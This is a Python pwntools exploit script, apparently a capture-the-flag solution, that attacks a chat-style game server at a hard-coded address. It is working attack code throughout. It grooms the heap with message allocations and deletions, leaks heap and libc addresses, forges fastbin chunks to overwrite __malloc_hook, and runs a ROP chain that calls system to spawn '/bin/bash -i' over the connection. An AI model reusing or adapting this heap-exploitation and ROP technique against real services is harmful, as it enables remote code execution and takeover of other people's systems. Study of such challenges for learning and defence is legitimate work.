#!/usr/bin/env python
from pwn import *
context.update(arch='amd64', os='linux')
p, u = pack, unpack

SERVER = ('52.196.222.23', 5566)

def login(conn, name):
    conn.sendline(name)
    for i in xrange(3):
        conn.recvline()

def whoami(conn):
    conn.sendline('/whoami')
    for i in xrange(3):
        conn.recvline()
    info = conn.recvline()
    conn.recvline()

    info = info[len(' Player '):]
    player_id = int(info[:3])
    info = info[3 + len('        '):]
    name = info[:20].strip()
    info = info[20:]
    room = info.strip()
    if room == 'N':
        room = None
    else:
        room = int(room)

    return player_id, name, room

messages = []
def msg(conn, player_id, message):
    global messages
    conn.sendline('/msg {} {}'.format(player_id, len(message)))
    conn.recvuntil('Your msg: ')
    conn.send(message)
    conn.recvline()
    messages.append(message)
    return message

def delete_log(conn, message_id):
    global messages
    del messages[message_id]
    conn.sendline('/del {}'.format(message_id))
    conn.recvline()

def delete_message(conn, message):
    delete_log(conn, messages.index(message))

def log(conn):
    conn.sendline('/log')
    conn.recvline()
    msgs = []
    count = 0
    while len(msgs) < len(messages):
        l = conn.recvline().rstrip('\n')
        if ' : ' not in l:
            continue
        msgs.append(l.split(' : ')[1])
    return msgs

def create(conn):
    conn.sendline('/create')
    conn.recvline()

def start(conn):
    conn.sendline('/start')
    conn.recvuntil('-------------------------------------------------------\n')

conn1 = remote(*SERVER)
login(conn1, 'player1')
create(conn1)
player1, _, _ = whoami(conn1)

conn2 = remote(*SERVER)
login(conn2, 'player2')
player2, _, _ = whoami(conn2)

print 'Spamming messages'

num_messages = 17
pads = []
for i in xrange(num_messages):
    name = 'pad{}'.format(i)
    pads.append(msg(conn1, player2, name.ljust(0x28, '\0')))

for _ in xrange(8):
    delete_message(conn1, pads.pop())

msg_0x50 = msg(conn1, player2, '0x50'.ljust(0x50, '\0'))

guard1 = msg(conn1, player2, 'guard1'.ljust(0x400, '\0'))
overwrite = msg(conn1, player2, 'overwrite'.ljust(0xae8, '\0'))
target = msg(conn1, player2, 'target'.ljust(0xae8, '\0'))
top = msg(conn1, player2, 'top\n'.ljust(0x400, '\0'))
guard2 = msg(conn1, player2, 'guard2'.ljust(0x400, '\0'))

delete_message(conn1, target)
delete_message(conn1, overwrite)

overwrite = msg(conn1, player2, 'overwrite'.ljust(0xae8, 'A'))
delete_message(conn1, overwrite)

overwrite = msg(conn1, player2, 'overwrite'.ljust(0xae8, '\0'))

partial1 = msg(conn1, player2, 'partial1'.ljust(0x80, '\0'))

# replenish the 0x28 fastbin
delete_message(conn1, pads.pop())
delete_message(conn1, pads.pop())

partial2 = msg(conn1, player2, 'partial2'.ljust(0x50, '\0'))

print 'delete partial1 and top'
delete_message(conn1, partial1)
delete_message(conn1, top)

use_smallbin = msg(conn1, player2, 'use_smallbin'.ljust(0x1a8, '\0'))

partial1 = msg(conn1, player2, 'partial1'.ljust(0x80, '\0'))
partial2_2 = msg(conn1, player2, 'partial2_2'.ljust(0x50, '\0'))

delete_message(conn1, msg_0x50)
delete_message(conn1, partial2_2)

msgs = log(conn1)
heap_addr = u(msgs[10].ljust(8, '\0'))
print 'heap_addr =', hex(heap_addr)

print 'consolidate fastbin'
consolidate = msg(conn1, player2, 'consolidate'.ljust(0x1000, '\0'))

print 'about to delete partial1'
delete_message(conn1, partial1)

msgs = log(conn1)
libc_addr = u(msgs[10].ljust(8, '\0'))
libc_base = libc_addr - 0x3c4188
print 'libc_base =', hex(libc_base)

payload = ''
payload += 'P' * 0x80
payload += p(0) # prev_size
payload += p(0x71) # size
payload += 'B' * 0x68
payload += p(0x71) # size
payload = payload.ljust(0x300, '\0')

overlap = msg(conn1, player2, payload)

# free fake fastbin
delete_log(conn1, 10)

delete_message(conn1, overlap)

malloc_hook = libc_base + 0x3c3b10
fake_fastbin_chunk = malloc_hook - 0x20 - 3

payload = ''
payload += 'A' * 0x80
payload += p(0) # prev_size
payload += p(0x71) # size
payload += p(fake_fastbin_chunk)
payload += 'B' * 0x60
payload += p(0x71) # size
payload = payload.ljust(0x300, '\0')
overlap = msg(conn1, player2, payload)

fb1 = msg(conn1, player2, 'fb1'.ljust(0x68, '\0'))

'''
   33314: 48 81 c4 18 08 00 00  add    $0x818,%rsp
   3331b: 89 d8                 mov    %ebx,%eax
   3331d: 5b                    pop    %rbx
   3331e: 5d                    pop    %rbp
   3331f: 41 5c                 pop    %r12
   33321: 41 5d                 pop    %r13
   33323: 41 5e                 pop    %r14
   33325: 41 5f                 pop    %r15
   33327: c3                    retq
'''
stack_lift = libc_base + 0x33314

print 'about to allocate fb2'
payload = ''
payload += 'A' * 0x13
payload += p(stack_lift)
payload = payload.ljust(0x68, '\0')
fb2 = msg(conn1, player2, payload)

#   f6224: 48 8d 7c 24 0c        lea    0xc(%rsp),%rdi
#   f6229: ff d0                 callq  *%rax
lea_and_call = libc_base + 0xf6224
pop_rax_ret = libc_base + 0x1059b3
ret = libc_base + 0xf6240
system = libc_base + 0x45380

payload = ''
payload += '\n' * 8
payload += p(pop_rax_ret)
payload += p(system)
payload += p(lea_and_call)
payload += 'A' * 0xc
payload += '/bin/bash -i <&4 >&4\0'
while len(payload) < 0x400 - 8:
    payload = payload[:8] + p(ret) + payload[8:]

start(conn1)
conn1.sendline(payload)

conn1.interactive(prompt='')
